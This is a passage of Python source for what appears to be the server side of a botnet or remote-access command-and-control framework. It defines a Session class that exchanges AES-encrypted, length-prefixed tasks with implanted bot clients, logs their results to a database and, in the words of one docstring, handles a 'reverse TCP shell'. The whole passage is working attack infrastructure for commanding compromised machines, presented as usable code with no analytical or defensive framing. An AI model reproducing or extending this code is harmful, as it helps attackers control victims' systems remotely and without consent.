        data = security.decrypt_aes(msg, self.key)
        info = json.loads(data)
        for key, val in info.items():
            if str(val).startswith("_b64"):
                info[key] = base64.b64decode(str(val[6:])).decode('ascii')
        return info

    def status(self):
        """
        Check the status and duration of the session

        """
        c = time.time() - float(self._created)
        data = ['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
                '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
                '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
                '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
        return ', '.join([i for i in data if i])

    def send_task(self, task):
        """
        Send task results to the server

        `Requires`
        :param dict task:
          :attr str uid:             task ID assigned by server
          :attr str task:            task assigned by server
          :attr str result:          task result completed by client
          :attr str session:         session ID assigned by server
          :attr datetime issued:     time task was issued by server
          :attr datetime completed:  time task was completed by client

        Returns True if succesfully sent task to server, otherwise False

        """
        if not isinstance(task, dict):
            raise TypeError('task must be a dictionary object')
        if not 'session' in task:
            task['session'] = self.info.get('uid')
        data = security.encrypt_aes(json.dumps(task), self.key)
        msg  = struct.pack('!L', len(data)) + data
        self.connection.sendall(msg)
        return True

    def recv_task(self):
        """
        Receive and decrypt incoming task from server

        :returns dict task:
          :attr str uid:             task ID assigned by server
          :attr str session:         client ID assigned by server
          :attr str task:            task assigned by server
          :attr str result:          task result completed by client
          :attr datetime issued:     time task was issued by server
          :attr datetime completed:  time task was completed by client

        """

        header_size = struct.calcsize('!L')
        header = self.connection.recv(header_size)
        if len(header) == 4:
            msg_size = struct.unpack('!L', header)[0]
            msg = self.connection.recv(msg_size)
            data = security.decrypt_aes(msg, self.key)
            return json.loads(data)
        else:
            # empty header; peer down, scan or recon. Drop.
            return 0

    def run(self):
        """
        Handle the server-side of the session's reverse TCP shell

        """
        while True:
            if self._active.wait():
                task = self.recv_task() if not self._prompt else self._prompt
                if isinstance(task, dict):
                    if 'help' in task.get('task'):
                        self._active.clear()
                        globals()['c2'].help(task.get('result'))
                        self._active.set()
                    elif 'prompt' in task.get('task'):
                        self._prompt = task
                        command = globals()['c2']._get_prompt(task.get('result') % int(self.id))
                        cmd, _, action  = command.partition(' ')
                        if cmd in ('\n', ' ', ''):
                            continue
                        elif cmd in globals()['c2'].commands and callable(globals()['c2'].commands[cmd]['method']):
                            method = globals()['c2'].commands[cmd]['method']
                            if callable(method):
                                result = method(action) if len(action) else method()
                                if result:
                                    task = {'task': cmd, 'result': result, 'session': self.info.get('uid')}
                                    globals()['c2'].display(result.encode())
                                    globals()['c2'].database.handle_task(task)
                                else:
                                    globals()['c2']._print("Error! Malformated return value from command! Session scheduled and ran command '" + cmd + "'but it returned a None value. Please return a string")
                                continue
                            else:
                                globals()['c2']._print("Error! Malformated method in Session! Session regiestered the method in C2.method[" + cmd + "] as callable when it, in fact, wasn't.")
                        else:
                            task = globals()['c2'].database.handle_task({'task': command, 'session': self.info.get('uid')})
                            self.send_task(task)
                    elif 'result' in task:
                        if task.get('result') and task.get('result') != 'None':
                            globals()['c2'].display(task.get('result').encode())
                            globals()['c2'].database.handle_task(task)
                        else:
                            globals()['c2']._print("Error! Malformated task in Session! Tasks has a result field set to None. Verify bot communication code and return values from internal Session functions.")
                    else:
                        globals()['c2']._print("Error! Malformated task to Session! Tasks need to include one of the following keys: result, prompt, or help.\n")
                else:
                    if self._abort:
                        break
                    elif isinstance(task, int) and task == 0:
                        break
                    else:
                        globals()['c2']._print("Error! Malformated task to Session! It should be an int or a dict.\n")
                self._prompt = None

        time.sleep(1)
        globals()['c2'].session_remove(self.id)
        self._active.clear()
        globals()['c2']._return()


if __name__ == '__main__':
    main()
